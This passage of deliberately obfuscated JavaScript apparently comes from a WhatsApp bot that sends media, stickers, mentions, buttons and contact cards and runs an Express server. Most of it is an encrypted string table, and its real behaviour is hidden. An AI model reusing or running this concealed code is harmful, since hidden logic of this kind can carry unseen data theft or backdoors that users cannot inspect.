z={};z[TJ('qrUI',0x329)]=y[Tu('jF$J',0x3ac)]?y[Tu('dGmC',0x5c8)]:Config[Tu('[ixr',0x6a9)],z[Tu('nddH',0x3b7)]=y[TJ('nedN',0x524)]?y[TJ('kD3)',0x5bc)]:Config[TJ('Snxf',0x44b)],z[Tu('[6DJ',0x57c)]=y[TJ('#@yP',0x486)]?y[TJ('n)xc',0x78a)]:[],h=await W[Tu('N[@@',0x5d6)](U,s,z),await fs[Tu('8BvI',0x76d)][TJ('FrlN',0x41a)](X),Z=W[TJ('w16Y',0x589)],i=W[Tu('N[@@',0x42e)];}else{if(/image/[TJ('s^Fc',0x6d1)](I))Z=Tu(']edL',0x524);else{if(/video/[Tu('^6X@',0x53d)](I))Z=Tu('yq$D',0x3bb);else{if(/audio/[TJ('4FV4',0x573)](I))Z=TJ('Fy60',0x58b);else Z=TJ('yq$D',0x57f);}}}const a={};a[Tu('w16Y',0x5d1)]=h;function Tu(F,W){return T4(W-0x3eb,F);}const q={[Z]:a,'caption':C,'mimetype':i,'fileName':O,...y},f={'quoted':n,...y};return await Q[TJ('qfl[',0x5d7)](w,q,f),fs[TJ('8BvI',0x78d)][Tu('P3G[',0x31a)](h);},Q[T4(0x184,'Fy60')]=async(w,V,O={})=>{let C;O&&(O[TR('Snxf',0x585)]||O[TA(0x364,'s^Fc')])?C=await W[TR('[ixr',0x6f1)](writeExifVid,V,O):C=await W[TR('PvnQ',0x6d2)](videoToWebp,V);const n={};n[TR('q(Fq',0x371)]=C;const y={'sticker':n,...O};function TR(F,W){return T4(W-0x3b5,F);}function TA(F,W){return T4(F-0x3a1,W);}await Q[TA(0x39c,'Cwb0')](w,y,O);},Q[T4(-0xb8,'L1Eo')]=async(w,V,O={})=>{let C;function TE(F,W){return T4(W-0xc3,F);}O&&(O[TM(0x334,'g[45')]||O[TE('Snxf',0x103)])?C=await W[TE('8BvI',0x1b1)](writeExifImg,V,O):C=await W[TE('s^Fc',0x43c)](imageToWebp,V);const n={};n[TE('k^n3',0x47)]=C;function TM(F,W){return T4(F-0x3c3,W);}const y={'sticker':n,...O};await Q[TE('n)xc',0x357)](w,y,O);},Q[T4(0x31f,'p(mL')]=async(w,V,O,C={})=>Q[T4(-0x2e,']edL')](w,{'text':V,'contextInfo':{'mentionedJid':[...V[T4(0x26c,'DZj@')](/@(\d{0,16})/g)][T5(0x4ba,'DZj@')](n=>n[0x1]+T4(0xe6,'nddH'))},...C},{'quoted':O}),Q[T4(0x28b,'&4XY')]=async(w,V,O='',C='',n)=>{let y=Buffer[TH('k3b4',0x458)](V)?V:/^data:.*?\/.*?;base64,/i[Tb(0x731,'YFN*')](V)?Buffer[TH('s^Fc',0x3a8)](V[Tb(0x5d6,'q(Fq')]`,`[0x1],W[Tb(0x6ae,'FrlN')]):/^https?:\/\//[TH('#@yP',0x222)](V)?await await W[TH('P3G[',0x2ad)](getBuffer,V):fs[TH('FrlN',0x524)](V)?fs[TH('[6DJ',0x3c1)](V):Buffer[Tb(0x75f,'dGmC')](0x0);const g={'image':y,'caption':O,...n},I={};function Tb(F,W){return T5(F-0x39b,W);}I[TH('nddH',0x199)]=C;function TH(F,W){return T4(W-0x1ed,F);}return await Q[Tb(0x5d5,'dGmC')](w,g,I);},Q[T4(-0x3c,'#@yP')]=(w,V,O='',C)=>Q[T4(-0x4f,'jF$J')](w,{'text':V,...C},{'quoted':O}),Q[T4(0x10d,'&4XY')]=(w,V=[],O,C,n='',y={})=>{function To(F,W){return T5(F-0x290,W);}const g={'text':O,'footer':C,'buttons':V,'headerType':0x2,...y};let I=g;const m={'quoted':n,...y};Q[To(0x623,')V19')](w,I,m);},Q[T5(0x397,'fG[m')]=async(w,V='',O='',C,n=[],y,g={})=>{const I={};I[TL(0x4a2,'DgCj')]=C,I[p0(0x786,'k^n3')]=y;const m={};m[p0(0x584,'S[Xd')]=Q[TL(0x399,'8pj0')];let c=await W[TL(0x3d9,'6Gvh')](prepareWAMessageMedia,I,m);const k={};k[p0(0x851,']edL')]=c[p0(0x76d,'$c1w')],k[p0(0x664,'[6DJ')]=V,k[TL(0x706,'jF$J')]=O,k[TL(0x605,'s^Fc')]=n;const X={};X[p0(0x858,'8pj0')]=k;function p0(F,W){return T5(F-0x2ed,W);}const Z={};function TL(F,W){return T5(F-0x1b1,W);}Z[p0(0x5ab,'qrUI')]=X;var i=W[p0(0x649,'Fy60')](generateWAMessageFromContent,w,proto[TL(0x400,'[ixr')][p0(0x462,'P3G[')](Z),g);Q[p0(0x55d,'k3b4')](w,i[p0(0x7f8,'&4XY')],{'messageId':i[TL(0x36f,'uu]K')]['id']});},Q[T5(0x1c4,'b1Jh')]=(w,V=![])=>{id=Q[p1('K@#W',0xc4)](w);function p2(F,W){return T4(F-0x276,W);}V=Q[p1('$c1w',-0x10b)]||V;let O;if(id[p1('Snxf',-0xb8)](W[p2(0x5b6,'L1Eo')]))return new Promise(async C=>{O=store[p3('S[Xd',0x5bb)][id]||{};function p3(F,W){return p2(W- -0x2b,F);}if(!(O[p4('DgCj',-0x4d)][p3('[ixr',0x1b2)]||O[p4('8BvI',-0xd)]))O=Q[p4('4FV4',-0xa)](id)||{};function p4(F,W){return p1(F,W- -0x142);}C(O[p4('qfl[',-0x201)]||O[p3('4FV4',0x370)]||W[p4('N[@@',0x211)](PhoneNumber,W[p4('Snxf',-0x221)]('+',id[p3('nddH',0x5b9)](W[p4('akR7',0x221)],'')))[p4('w16Y',-0x55)](W[p3('akR7',0x286)]));});else O=id===W[p1('dGmC',-0xa8)]?{'id':id,'name':W[p1('fG[m',-0x3c)]}:id===Q[p2(0x2d6,'^6X@')](Q[p2(0x464,'[6DJ')]['id'])?Q[p1('4FV4',0x1b8)]:store[p1('DZj@',0x30f)][id]||{};function p1(F,W){return T5(W- -0x273,F);}return(V?'':O[p1('nddH',0xd5)])||O[p1('YUh9',0x2a4)]||O[p1('K@#W',0x283)]||PhoneNumber(W[p2(0x3a6,'q(Fq')]('+',w[p1('nddH',0x318)](p2(0x203,'&4XY'),'')))[p2(0x333,'jF$J')](W[p2(0x368,'dGmC')]);},Q[T4(0x39b,'dGmC')]=async(w,V,O='',C={})=>{function p5(F,W){return T4(W-0x178,F);}let n=[];for(let m of V){n[p5('p(mL',0x296)]({'displayName':await Q[p5('dGmC',0x35b)](W[p5('K@#W',0x168)](m,p6('K@#W',0x400))),'vcard':p5('P3G[',0x175)+await Q[p6('q(Fq',0x508)](W[p5('DgCj',0x288)](m,W[p5('Snxf',0xb0)]))+p6('q(Fq',0x500)+global[p6('s^Fc',0x181)]+p6('k^n3',0x21b)+m+':'+m+p6('[ixr',0x31c)+global[p6('P3G[',0x53c)]+p5('tTKA',0x10a)+global[p5('dGmC',0x25b)]+p6('S[Xd',0x4e8)+global[p5('YFN*',0x18d)]+p5('k^n3',0x10b)});}const y={};y[p6('akR7',0x1b4)]=n[p6('s^Fc',0x2d7)]+p6('kD3)',0x520);function p6(F,W){return T5(W- -0x5,F);}y[p6('4FV4',0x329)]=n;const g={'contacts':y,...C},I={};I[p6('k^n3',0x260)]=O,Q[p5('#@yP',0x1b0)](w,g,I);},Q[T5(0x4af,'nedN')]=w=>{const V={};function p8(F,W){return T4(W-0x1aa,F);}V['to']=W[p7(0x4f3,'DZj@')],V[p7(0x4db,'YFN*')]=W[p7(0x6bd,'^6X@')],V[p8('S[Xd',0x318)]=p7(0x567,'s^Fc'),Q[p8('uu]K',0x255)]({'tag':'iq','attrs':V,'content':[{'tag':W[p7(0x5bf,'S[Xd')],'attrs':{},'content':Buffer[p8('#@yP',0x35f)](w,W[p8('dGmC',0x1bb)])}]});function p7(F,W){return T4(F-0x44c,W);}return w;},Q[T4(0x3b3,'Snxf')]=w=>sms(Q,w,store);}app[rR(0x26b,'8pj0')](express[rR(0x22e,'8pj0')](path[rR(0x21d,'^6X@')](__dirname,rR(0x406,'qrUI')))),app[rA('uu]K',0x1e8)]('/',(W,e)=>{function p9(F,W){return rA(W,F-0x58b);}const G={};G[p9(0x78a,'Cwb0')]=pr(0x756,'8BvI');function pr(F,W){return rA(W,F-0x61f);}const N=G;e[pr(0x57e,'L1Eo')](N[pr(0x6fc,'6Gvh')]);}),app[rR(0x496,'nddH')](port,()=>console[rA(']edL',0x69)](rR(0x29e,')V19')+port));function rR(F,W){return j(F- -0x110,W);}function rA(F,W){return j(W- -0x351,F);}setTimeout(()=>{const F={'ZJuVq':function(W){return W();}};function pT(F,W){return rA(F,W-0x6aa);}F[pT('^6X@',0x528)](connectToWA);},0xfa0);function B(){const pB=['WOBdISopWRG','h0HS','WPJdISo1WQldLhv/yG','WRJcOCkMoCo5WP7cSq','nmkWuSoYBCowWQbO','uhrGd8kTWOtcQ8kkWQpdSSoB','ymkLWPCdW6W2jMDAW7OT','ps8y','W5/dON5EBsvIAW','mGCCW4fq','WQfFWRu','ESkLiCoh','W57cKSksW6FcKY8LmCkYWOn2AxpdGa','C03cMwtcTW','8y2tGUkdR/cNKQy','y8kHWPOmW48Yohe','lCoeW78MWQ0N','hSodWRaLWRa1W4GUvMXwsapdPhO','W4X1ASk6','WQHaCrfgdCkPgmoRzfO','ySkZn8ogkG/cPW','8yIMJU+7Nq','rSkOW4/dSefCWP/cU8kMW5xcLSkipSohnZTeW59v','dbldOmoN','W4T3WQBcHq','W4jCWOdcKCoP','W4K7gdS3','8y2nPo+7Rq','8jMHQ+kbLEkBGo+7La','8jUDHo+4Ka','WQBdLmk4W54t','rSk0WOa4WR7cHCocgYJdRmkXnxzUWPu6','BSkFW7/dKa','w1X0W6lcHSoafaNcRSkHemkTW5VcThm2WRWXW4hcPCoGlmoKB3qCmGFcMCkLWQRcISoJoXPvh8o6cHVcJaiCe8k+','W65zWRmbBa','sfVcTKGPWR7cSHVcG2TFWOhcSCo8B8kruG','8jMIHEkbLEkyLE+7La','BguFW5lcOa','WRlcSNLFWPZcQCoKa8k1gwazoG','tuBcT0S','tN/dPI/cQa','WPOeW78','WR3cP8k0WQWhw8k9WRddTfZdGf0','WOpdR8kovmkWW5JdVmonihNcQSkUxGxdJ8o4WR4SDJ43g8orW6tcLgVdRCk3b8oWWQNdTCkDWP4','a198W7lcHSoJdWJcRW','W7ZXJ4EScCkJFCoiEmofdCk+W6/dTWtdHCkYgmkrW7JdSxn7WPVdUNmhWRaLW4JcSaCkW6XVWOy','CJZcKauR','WQtdHCkf','AcPXdCoLxSkId8odcSo6WPbUeW','spgpL4K6WOecffb+W5GAuIBdOhe8W5JcL8k1W4hdJSoDxCoFeqtdH8kqW4CfWPKDECo4aCkZWRO84O+277QiW7OJWQG','8kgySUkcNUkBK++5JG','8jM/IU+5LW','WOD2WQZcOGS','zCk5lCoB','jv7dPSkqWRpcG8oM','kJ7dGxHXW4raxCkMW4eReG','W4JdHCkqsJG6W4tdP8oJW6NcKaRdNmkdWPJdHJ4','W7VcI1ml','WQKzWRKXCINcJSkHuq','eG3dHfH6','WRznWQ7cOrpcUJWh','frldOmoGigJdIG','W4ClwSkbvSoTouFdQSovsG','W6mFjJ8Yf0y','lf1Oxb9MWRfCW5/cJSodW6VdQSkKW5S','WPBcQgL/yI5U','WQrfW58/WQG','DZf/','WQFdOSk0W60Q','W5pdLCoCjCoVhmky','WQddQmk0W6WGkq','rh/dVYZcSGtdT1BcGNhdVSkX','hbBdP8oY','WRGgW5pdU8kf','p012vGnHWRPqW5JcNa','WQlcR3jzWP3cLCoG','AMVcO0JcGq','aeHTW7i','WPhcQt5eWPdcL8oGaSk7cNvej8kCWRK','rflcVKm+','svVcRgG5WRdcPbFcNJC','W6NcTCksmSoZ','WOBdOmkya3a','WOaEW67dISkc','x3VdTa','gIZcNxX8W6HrqmkZW5G0uHNdQfK','iSkJxSo0vSoLWOe','x3VdTcS','nYVdINTX','W5j9aSozg8oEhLC','8kQQJEkcM+kAVo+7Nq','WRRcV2K','mSkLwSo8Ba','WR7cTmkIe8oP','W47dKCoDiSoNgmkuW67cI8ohdW','Au7cSN/cRdPW','8kI7TUkcK+kyKU+7LW','W7GflKisoSkFhCoGteCCFCkwW6qa','WQy/xCogW4K','sVglPk/dGdxdRvNdGcddQ8kmyCo5WOnCiCoUWOSjhXpcV8oNW5ZcVxzuWO7dS8kvW4LGW6/cRfxcL3tdPCkbkahdIduhtxFcQ1myzW','FSkLWOOuW4a0mgC','W4uYWQLbW5VcHczhW6KVW7JdNh9xlmkokGr4d8ovx8oOW5mcthyqW5G','WRJcP2W','bM4HWQW','bKH4W6NcL8oala3cRG','sSkFW5DgWRO','qCkEl8ouWQ8','FmkGEa','WQpcV2bFWPNcLCoX','WO3dH8kEWRxdKq','WR0Wq8omW6i','WO7cJ8k/WRaR','Dmk/WPO1W4FcG8oBaXpcPCkGl0LKWOL0eSo7wba','kItcVmkygW','WPNdLSo+W4tcVCkRneVdJmocia','W5nYAmkWW6DvW4hcK8oiW4nuWRm','WRjqWQO','WPmgW7NdPmkE','8y2FIEkdKpgcNAi','4PYDydRdV3jQWP7cVCkLW4aYqJLJW4bHCCoBySoDWRJdMSkGWPa','W6TFWR4','ACkEWQXBWRJcImoRyga','8kMaVEkdNEkzPo+5Oa','fmoiW5P4WP4','zaRcOCokW6xdK8k3WPC0W5BcNmknwa','WO/cKLBcRYu','eunJ','WR1kWQpcQq','A1pdTLm/','W5tcPmk9jSoGuq','W78kabqH','gNtdVG','zSkZWPWv','WRRdO8k5W6qWp8kwWPO','WP9BhSoedSoyga','pthcSSke','WRRcVmk7dmoKWOhcH8klDee','W4fNWQZcK8oCWR53WQyHmeWib8ktWOVcTSoLDG','bUkER8obc8k8WOxdV1GfjmkuW6RdGmoWkamgDKWmFH7cMmk/WOhdTSksAgnmWOdcVCkhsSk4smogWPtdSCkz','WPhdNmkVW54c','FmkZnSodlHO','zmkbWQO3W7e','tMpcT0W4','ASk/WOCIW7lcGCog','WPtdG8kCW6Oa','eSo4W5rcWOi','WRBcQCkZgmo1WR/cSCkbAupcRmoM','tKnadSkN','W7fFWRK+vchdG8kU','W6xdRCkJWR0iva','WR5vWQddGSo1aG','CqHok8om','WPxcJ1VcOttcMCkhCComWO7cH8oY','W7mqmvqtoSkzcmoPC3ekFmkbW6yxiSov','Aw7cHd0JWROrw8keW6qIkZ8','ptRdHW','lColW6Hd','WR3cTxC','WP5rcG','nSojW7OGWRKGW5K5y3LlfGhdOhRcLa','WPfFhCodbSoqeW','tSkzW7T6WOymWOb3pq','Bv3cQKmQWRlcVG','nICAW78','xadcLq8PWPJdJSoHD8k4ySki','hM1sDW1qWPzUW6RcVmo1','FJRcSJSm','lmovW7m9WQWXW7y0uW','rLhcQ1uTWRRcOW','W4BcK8kTaCoG','WQbzWR/dKCoKcvhdNa','smk9aCoyeG','ltVcG8kfhtVdJmoH','WQ7dKSoWWQtdHW','FmkZn8ogiGFcRmkW','zLhcMMlcSq','m17dUCkUWQe','W4ejoHW4','WO5GWQVcTdC','t23cU0ZcRa','WP0oW6hdVG','lJddV2rJW6XxCmkZW5SH','q3P8d8kLWOtcTSkj','WRLcWQFdKq','W5NdGSoai8o+nSkyW6RcI8ongLrU','htxdKSogmW','W5nLWP8yuq','mKpdOSkzWRZcHmoMWPS2W7/cGSkUxCoAud8juIK','WRZdHCkXfg/dI8kSFW','FSkLWOOuW4a0ma','W6PjBCkcW4S','ENKEW4/cI2Pp','WQpdNColW4BcLW','f0j7W7lcGSogeHC','taxcHa8OWQhcHSo0ySk0DCkiFW','ECk/iCocbaBcOCkMW7hcUCkniMpdUSoF','jv7dTCkjWQdcK8oQWOKh','u8kEW63dNe4','f0j4W6VcGSolaHC','nW8AW5Xc','eCkgsCo3vG','WRpcQ8k1','ibJdMmoeeG','W7agiq','WQVcKMNcTbi','W6hcVmoSW6yIaSkNWP3dLG','WRxcVxvFuW','kYRdQK54','CSkYA8o4CSorsmoik8k4','s8kKW4/dPvWcW5xdSmkvW5NcMSkubSoaAITkW5uF','iYuEW650','Ce/cMMdcQJXLaq','WO/dISolWRVdH3j1jCk+WPzDAL3dKmkWxmolzatcI1HQW5jAW4a','ENKdW4ZcNMXGsCoN','W4rcWP8fqq','W4tcRSkYiSoMs8ouBSoFcmk+W6a','WRTSWPZcVsG','8lA+HEkdKFcQNAG','WRdcQunhWPhcLCo/fmkO','gg4MWQFdNq','xCkwW4n4WRa','WO/dLSooWQhdSq','dMLqFW','WQNWKlkVW6PpW6OosSoJW5CsjgtdTuOAW7DNxCkeW6RdOCkQWO9xocRcN1yNW7ldRSozWPlcUq','WOjmaSoAbSomgfa','W6pcPmkWmCo3xmkhs8oofCk0W63dPWJdJ8oV','ueRdTZVcQG','hMqLWQ3dHJ7cHSoNWRK','WPRcQgq','o8oNW7e4WQW','z8kVWRuiW5y2j1DAW64T','W4j7WRe','nftdUmkiWRFcJSo3W5iwW6pcISk/','W7eqkealnW','WRrZWRCfWOxdLMyfWRbMWRJdHcGfAG','WQlcQNXAWOW','FmkZkSorcaFcRmk3W53cV8kk','WR3cOmkdWOKX','oSoNCCkbdb3cMmk3W4ZcJG','hqxdOCo8mW','cNmNWQ8','WO5IWQxcQX4','Bdf0cmoO','mIGEW6rU','WRRdO8kQW70X','BvZcHq','8ywdLUkaO+kBLo+6Tq','kIdcTmkuhsa','WRFcTN9CWOO','WRBcLNLxWQ4','WO7dPSkyWPNdKa','WO3dLSo1WQldJ396ymkP','WQhdQmk3W6CXpSk5WOddIW','qYDDydnqWPfUWQtcQmoLW5ddImozW7y3k3i','mdNcSCkwcG','lColW65yWPq','WR0HWPtcPu/cICk+','WRPoeqeGe07dQW','W70kosuN','s8kxECo7yW','W64qne4Em8kebSoPta','WOtcLCkiWOaZBCkkWPhdU37dUq','otpdNhHX','rw7dRG3cVW','zhuDW5FcJ2C','psujW6HS','a1bSCby','iMP0EZu','W74AkfmAj8kznCoIz00','DfJcHNK','WQNdGmk3dv8','nWKuW4jK','W7DxWR8IDs7dJCkU','WOjsWPRdNmoL','WOfYW7u','Eg4bW5FcHx1tumoM','awq7WRhdKZZcQq','wSkoW7L4','W77dUmkTAqjjWRJdKSofW4NcPNZcRSk9WQq','WOxdKSoIW5FcOmkG','WR9vWR/dM8oKfwVdKmoZ','WRRdI8kmbhldJW','8jcMJSk68jQlSexXJBgt8kMDImkR8jIiLmkq8kEjMq','zSkyW4VdLeC','WR/cH2DsBG','WRPAjConaa','WQpdJ8kB','l8ofW7eMWR0W','8jM8ME+5LW','WOmfW7tdPmkCzW','WOrwkSoggG','lJVcVmkxcq','W6Wvmtu','oL7dPCkpWRpcH8oM','8jwZQokdVokyQo+5Iq','kSovW60M','W6jeWQ4MAq','bEknG8odCSkuo8oDov5YquyoW7nRWPuzwf9IWQldVd/cUvu','W7mTfKqP','WOWaASoqW6G','lmovW782WP49W5a4zgvibq','W6LUDCk0W44','WRGasSoSW6m','dbldQ8oN','v2ZdQdZcQeNdQ1BcH37dVSkN','qLRcU0O5WRNcOWe','DCkhzCo+za','wCk3W7JdTNy','lCoaW7i7WQW','W6pdQSoUW6Tkg8oZW73cKrtcHHW','tmkjW6v9WPWiWQD7','WPdcN8oojCo9hSkjW63dHColgK4HdaRcGGa','CLJcLg7cTW','WQrBi8oFpG','lSopW7jpWRJcRCozFKawWOldISohW7aKbKnG','EI5OaSo3','8yYcSEkdN+kBTo+6NW','xf3cRe4JWQJcSJhcG2SfWPxcOSoS','vCk7k8oJWR4','WPJdPCkWna','r1eTW4xcOa','WOpcPeLxuW','lmovW78XWQW9W5mZENLvfqZdPMS','qwD1ca','WOddGmoiWRhdKNq','W6KqpLm','W59WWRy6uG','q1H9hW','mmoOW44XWO4','W6WBjILLra','WPazW7FdOmk9BSo7DCo4WRO','ECkDwCoeta','rWZcGHKNWRldJG','vqLRdCoR','WQddMSk/W6yr','WQ58WRhdMSoH','WRRdQmkZWPddHmkhW4yBWOpcOZy','W6Wfe38n','BSkDWQOzW4xdTmkjtKOZWOBdISor','lrBdG8oknq','ochcTmkyah3dJ8o2W6NdIW','e196W7pcK8oOaXdcQ8opgmkTW58','DSkjk8oZWROUW6K','W7ntWQq9','WR5vWRZdKmo1aM/dJmo6Af0y','FCkVWO0oW4CQ','WQ3cO1lcOcK','nWddVCo2m0hdJSkKAW','pcumW75HySkj','W5rUy8kHW618W6NcHCoiW5fsWRfc','W43cRSk1oG','WRvxW7OIWQm','ldxdTSo9jG','W7eAiq','W53dN8obiSoRa8kjW5FcHmopfa','W5v6B8k+W6z5W4NcHq','lthcQmkf','WOBdLmkjWOtdMq','tbBdMCoKbLVdOG','t8kfW6beWRq','WP0oW6e','W7G5aKmN','W5tcSCkWpCo3','sKZcSuK/','h21qCJL4WObUW7JcUSo3W5e','ACkJkSowpWhcRCkT','n8kHxCoWDW','xCkmW6z5WPSkWQTQmmoCW6KYoCoFfsJdJXdcNIRdRmo0WQDd','ldBdL257','ymk0WPGvW5uGaN1pW7u','WQpdUmkPW6aloSkEWOW','p8oCW7i','WRJdI8kqfhtdGCkRAeJdSca','xKFcVvq','xXVcNq','lthcO8kf','CJH7c8o5','WObBdmougW','WOBcQCkLWPWZ','sSkeW7XEWOi','ndinW6jY','W4f0E8k7W6r3W4xcHa','y8kHWO0tW4qHoW','W44jEZS7evFdIbTxoCkziGBdLG','W7r6xSkMW5O','W4JdMCokiCobfCkEW7VcP8omcfnUarW','W4jBW4ldTCkcx8oasG','whhdQJ/cVGpdKvpcLW','W4DzWQBdKCo9qG/dOCk6s3OMbdHDWPlcU8oJCSoMkHetWPpcRSoclLRcO8ocAtTrW6hdI8kSWRHHW7RcTNFdHYr9W4FdOSkgv8oUj8oJc8o2','evldILfmWRZdN8o3ACoTk8k1nConW4NdJSkKW54irSkjoeHOfwpdHIZcR1VcJdeyWPWlAL8','4P6v4Ooa8jI5Ia','WOdcGK13BG','WRSHWP4','WQBdI8kpbq','W4Wnh1aB','8kUiI+kbSUkBJE+4JW','8ywaVUkaO/c6Rze','bMfwW47cRG','cwfpyYXuWPXtW6RcTSo1','i17dRSki','W7GBiLqOnSkzfa','wdesWRRdGGJcNCou','b0H7W6lcPComcGe','mtRdIG','yCkviSoKWP8','W5ldQCodjCo3','WOJdHmosWRC','W7qcW6hcH8kGqbhcICkIoa1z','W7ZdPmkTAq','WRtdQmkUW4yKnSkw','WQldHCkldG','oaCwW6jV','BCk1WP0/','D8kjnSoNWQ8H','EwKbW5FcJ20','WOVcGXFcTsxcVCkbACoAWP3dJCoXm15Xnw0KWQ7dPq','zmkmkmoalq','WQxdJ8kre3ZdHCkN','DSkHCmoOzCoWw8omkW','W5P7WQBcHCoWWQ9HWRegoey','pK1VqaL6WQTcW4lcNW','chbvydrgWRzKW6xcUa','CgXFomkh','WPvlW4GDWP4','WOioW6VdUq','WRtcOCkR','WQpcV31CWOZcK8oEgmk+','W4XMWRW','WQVcQ8kbc8oIWPVcUSkv','wfhcTKibWRJcTqhcJwiu','WOtcV3e','WPtcVxvuBIz5BCobW4NcQmkhW6dcLtpdUW','h2qMWQBdVZ7cV8o9WRZcUra','qgFdVt0','W6xdRCkQWQWdhCk+WQhdLf7dMvhcTaeZ','W5L/WQVcISotWQT/WQC','WRVcQ8kXcSo9WPFcUSkg','gqldP8o7lN0','WP/dGmoiWRldSNLPCq','m2/dRmkFWQm','WPOJt8oIW48J','yxOnW4BcNq','WQy2vSo9W6G','DCk1WPCeW5u6oNO','qwZdOq','kCorW4SIWRq7W505y3n1aX/dT2VcGW','AwKAW4VcHxS','W60voceYhKFdIa','W6ldTCk9','E3KaW4FcP2Xzu8oIwmob','ivldSSkzWR0','WPddVmkNWRFdVa','WO/cH1tcOHZcSCkrCCoEWOJcHq','W6z0WOVcTCoj','F8kJcCoWWPu','8lwjMokdHEkAOE+6SG','bKH0W6xcLW','WRpdL8oma3ldJmkXBfVdQZFcJNLaWRGlWRhdUCkSW4BcPmkLWQNdLwVdUrmoWOb/WQBdMW','WO/dJmkFkSk6b8ooW6ldMa','AmkyoCoYWQ86W5S3WRdcSq','8j6OUE+7UW','vSkho8ozWOK','WOhdOmk0WPldNW','f1PwCGu','W73dV8kxCruaW77dGq','n8k9wmo6zG','BLtdUa7cQG','mSk4vmoUtmozWQ5OtSohBmksbKldKG','nCovW6C','pc/dMe1d','Fmk+iCozjW','whhdQG','8jEKS+kaN+kyU++7IW','8jEoGU+4Nq','s3KDW6FcGW','ymk0WPaeW4O2jW','WPlcV3HvCg1HF8ocW6O','WRPkW6mrWOa','hCovW60wWRe','WPNdImkBWRNdJa','WQVcVwz3WP0','hxbmAWO','WPNcP8kkWQiU','WRxdOCk1W6C3','ASk/WOCIW7lcGCogbgRcUCkKi2v1WOi','o8ocW6W9WQO','W5T7WQxcJSojWQ9yWQSd','DJTRhCoVxmk1','WQNcML7cPsu','wvpdUaNcTG','WQ9rWQlcOa/cRtWh','8kMMQVcZT7S','pSoMW79fWOa','WQXgWQpcQsVcUYOhsCkBDq','q8k5kSofWPu','WRqUW5/dHmk8nSohu8oAWPWnEmk9WQZdGshcRSkmWQTfFmkoWO4xbW0','mKVdVSkzWR/cHCoXWP4oW5FcN8kPy8oErcK','WP3cKCk+oCo9','qfhcOq','y8k1WOm/W7/cICoceWNcQCkWlMvmWOjZcmo1uqy','CSkYB8oPFmorva','iadcHq8RW6tcHCogqCkvpSkAECoLW6/cVW','WQldQmkK','kCoyW7vg','W6ScisK9feBdNY5cmCodaqBdKCkUW5D0jG','W4VcRSk7','f0jGW6JcL8oafa','W6rWWQpcM13cJCk2xG','uwb9d8kHWOm','ifKnWPBdVW','k8oFW6PSWOe','hNXyFdvb','DqzidCoy','WQRcQSk+fSo+WPK','WPSoW6VdVSktA8o0','FSkMeCoToq','WOlcUw9yBsrIASou','gSoIWOJcPH8iW4RdR8ohWOldM8op','pXVcTCkGlq','ps8CW6X0BmkdW7m','tSkzW7DXWRqaWQz7cSokW6L+','WR7cRmkQWQWpwq','oHlcOSk1pG','hcumW75HySkj','htNcKCkHnG','BM4bW47cP2W','cGpcO8kWhG','FmkZkSorbG3cSCkWW53cU8kB','WOlcVxfyDW','rLhcV0CMWQ4','8k6sUokaVpc5N6G','h3eKWQVdHG','W6joWQGSDsVdHCkVDSk7w8kPq0q2W5/cUfVdMW','mmoNW7TmWOm','W5lcR8kWpCoTuG','bM1fya','W77cKSkEmSok','W5L/WRRcKSoy','zCkHASo4','ACktWQqBW4pcUCoXAwq7WQu','WPVdV8oMW7JcVq','8kMUIo+6Va','l2aKWQ7cKINcQCoKWRJcVqhdNmkAcCk+WOhcIh7cJ8oHrCkHWQxdPJ3dM8k9WP4klsLRWRzZ','FmkZkSorbG3cPSkQW50','p0qBWPhdUXtcGSorWPtcMG','WPhcPSk3WQ8j','tXhcHq8OWRhdJSo2umk8FCkzvCoPW7JdSCkKW5Si','umk9zCo6xq','xSkLWOOuW4a0ma','WRJcThjCWOa','W6fvw8kdW74','WPJdGmovWQi','ks/dN2jG','dJ3cVmkDtZxdH8oOW6NdNJRdN1/cH8kdemkUW7ybvSkSivKSWQRcSmonW789','WP/dGmoiWRldQ3LIDSk6WOLr','aVcQL6dcRe8rW43dQmoIW4K4W59tW4JcVgldRCo5auhcRguCySkPWQJdJCo/kSo8jv5mW4WNBKNcLw0XwX45W65tW79UWOy','W5BdLCoomG','oh1jqHa','WPZdHmouWQldJ394DCk6WOba','wSkmW71tWQu','W50OaH0u','kSoFW5i9WQ8XW44EvM9d','W7WamK8qlq','cXldVCo3dgRdNmk6B8knWPq','yCkvWPeaW5e','WOpdJ8khWRFdSa','WRD2WQ9NBcFdGCk/uCk/u8kTie8GW5G','WRyixSoKW5uKW4vdW40','W4LZWRyivW','qmkFzCoTBa','wXZcNH4JWRe','WPJcQ8kOW6uVxCk1WRBdIfG','WRnoW58qWQG','jCkHqCo1ASouWQX5ASonCCoof0hdKq','W64fkK4l','sLJcTeKV','iSk4x8o9','W6pcSCk0oSot','WQTfWRZdL8oKgu7dL8k3igrcrxbKW5C','s8kKW4/dPvWcW5xdSmkFW5xcICkDxCompG','W4z0ySkHW61GW5dcQCovW4rC','nSk0xCo4ESo6WQH+CmodEmke','W4yWWQLdW5JcHYmxWQD7WP3cQdC','W6VdVCoQt8kIWOVcNCkcw07cNW','x1hcQ1i','WPtcTxrcDZbyDCodW6C','WOzrpSodhCowe0q','WOZcGCkblmozWR3cMSkTu2y','FSkPWPqcW5uQjxe','mYZdVhX6W6Xx','jmoIkSkPuSolymovpSkz','AZz3gSoH','WOJdMSk+WQtdHW','W4H+F8kMW6L/W4e','uhVdRJFcVWldLe/cHW','uNFdOt3dTHpdP1BcHG','W65fWP4MBW7dHmkMs8kWua','WP3dJSo8W5u','lcFcTCkd','nCkEyCoFBG','WOhcIfv1WRhcRG','W4P/WRJcLCouWQv8','WRtcOCkRda','kCo1WPG4W7hdICoebsVcUCkKiNjKWOL0ca','puamWOFdTWNdOCopWPtcOa','WQBcHKVcRdK','W6tdTCk3DGyoW7u','WP3dKSo0W4q','WOadW5/dVmkh','Emkno8oOWR5KW7G7WQNcQq','W7NWViceWQJHTyhpQUkhOokhUSkpYOhmMTo3tm+d4OsH4OE6ZyxmJTkW4OUGdS23Yl3cVTgm0RNpRTkOW67lVEg2Q9gD0lNsH8IbW67tTS6LZyfR4OM+ZQVlNncNmnoXZyRpSTgGeUg2IngzYjhqHm620iFsV8YcZRZkQmkV8jotL8oq','W7pcGmkWgCov','BSkBWRGEW4S','DSoMbCkOnSkeW7K5ASopxCkwlfe','WO9cWQldKSoX','WOtdG8o1W4dcSq','sCkpW7nN','b8o6W4yFWR8','8ywaVUkaO/c6HiO','kZxcVSkvad8','av15W6NcGSob','WO/dHmosWRpdGxnJBmk+WP0','qmk+W6hdO0S','WQmWWPxcV0dcICkYAmkB','jv7dU8ktWQBcHCojWPyg','ASksf